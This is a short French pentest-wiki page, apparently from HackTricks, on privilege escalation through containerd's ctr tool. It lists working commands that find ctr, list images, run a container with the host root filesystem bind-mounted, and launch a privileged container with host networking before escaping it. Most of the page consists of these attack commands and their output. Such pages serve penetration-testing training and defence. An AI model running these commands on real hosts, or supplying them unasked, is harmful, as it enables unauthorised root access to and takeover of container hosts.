# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Suivez le lien suivant pour apprendre **où `containerd` et `ctr` s'insèrent dans la pile de conteneurs**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Si vous constatez qu'un hôte contient la commande `ctr` :
```bash
which ctr
/usr/bin/ctr
```
Vous pouvez lister les images :
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Et ensuite **exécutez une de ces images en y montant le dossier racine de l'hôte**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Lancer un privileged container et s'en échapper.\
Vous pouvez lancer un privileged container comme:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Ensuite, vous pouvez utiliser certaines des techniques mentionnées dans la page suivante pour **vous en échapper en abusant des capabilities privilégiées** :

{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
